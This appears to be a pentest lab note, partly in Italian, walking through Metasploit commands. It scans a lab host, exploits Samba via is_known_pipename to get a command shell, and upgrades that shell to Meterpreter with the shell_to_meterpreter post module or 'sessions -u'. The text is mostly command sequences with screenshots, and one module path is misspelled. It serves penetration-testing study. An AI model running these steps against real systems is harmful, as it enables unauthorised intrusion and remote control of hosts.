# Upgrading Command Shells To Meterpreter Shells

## Enumeration & Exploitation

```
service postgresql start && msfconsole
workspace -a upgrading_shells
setg RHOSTS 192.136.51.3
db_nmap -sV 192.136.51.3
search type:exploit samba
use exploit/linux/samba/is_known_pipename // ci consente di fare upload di una shared object/library
show options
run
    ls
    pwd
    /bin/bash -i
    CTRL+Z
sessions
```

<figure><img src="../../.gitbook/assets/image (1166).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1167).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1168).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1169).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1170).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1171).png" alt=""><figcaption></figcaption></figure>



## Utilizzando un modulo post-exploitation

```
search shell_to_meterpreter
use post/multi/menage/shell_to_meterpreter
show options
set SESSION 1
set LHOST eth1
run
sessions
sessions 2
exit
sessions
```

<figure><img src="../../.gitbook/assets/image (1172).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1173).png" alt=""><figcaption></figcaption></figure>

## Metodo pi√π semplice, con un utile comando

```
sessions
sessions -h
sessions -u 1 //il flag -u fa l'upgrade da shell a meterpreter session
```

<figure><img src="../../.gitbook/assets/image (1174).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1175).png" alt=""><figcaption></figcaption></figure>
